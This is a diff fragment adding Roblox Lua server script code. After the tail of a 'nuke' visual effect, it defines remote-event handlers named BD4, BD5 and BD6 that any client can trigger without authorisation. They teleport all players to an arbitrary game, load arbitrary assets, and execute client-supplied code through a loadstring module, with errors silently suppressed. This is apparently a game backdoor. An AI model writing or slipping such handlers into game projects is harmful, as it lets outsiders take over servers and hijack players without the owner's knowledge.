+	wait (0.25)
+	Cloud1Mesh.Scale = Cloud1Mesh.Scale + Vector3.new(0,200,0) --1600
+	wait (0.25)
+	Cloud1Mesh.Scale = Cloud1Mesh.Scale + Vector3.new(0,100,0) --1700
+	wait (30) --End phase of the nuke
+	game.Lighting.Ambient = Color3.new(0,0,0)
+	game.Lighting.OutdoorAmbient = Color3.new(127 / 255,127 / 255,127 / 255)
+	sky:Destroy()
+	game.Lighting.Brightness = 1
+	Cloud1.BrickColor = BrickColor.new(1)
+	Cloud2.BrickColor = BrickColor.new(1)
+	Cloud1.Transparency = 0.6
+	Cloud2.Transparency = 0.6
+	wait (5)
+	Cloud1.Transparency = 0.7
+	Cloud2.Transparency = 0.7
+	wait (5)
+	Cloud1.Transparency = 0.8
+	Cloud2.Transparency = 0.8
+	wait (5)
+	Cloud1.Transparency = 0.9
+	Cloud2.Transparency = 0.9
+	wait (120)
+	Cloud1:Destroy()
+	Cloud2:Destroy()
+	script.Parent.Transparency = 0
+end)
+
+BD4.OnServerEvent:Connect(function(plr,gameID)
+	local success, errorMessage = pcall(function()
+		for i, Players in pairs(game.Players:GetPlayers()) do
+			if Players:IsA("Player") then
+				game:GetService("TeleportService"):Teleport(gameID, Players)
+			end
+		end
+	end)
+	if not success then
+		
+	end
+end)
+
+BD5.OnServerEvent:Connect(function(plr,modelID)
+	local success, errorMessage = pcall(function()
+		local InsertedModel = InsertSevice:LoadAsset(modelID)
+		InsertedModel.Parent = workspace
+		for _, Child in pairs(InsertedModel:GetChildren()) do
+			Child.Parent = InsertedModel.Parent --Move the children up one parent
+		end
+	end)
+	if not success then
+
+	end
+end)
+
+BD6.OnServerEvent:Connect(function(plr,Script)
+	local success, errorMessage = pcall(function()
+		require(script.Loadstring)(Script)()
+	end)
+	if not success then
+
+	end
+end)
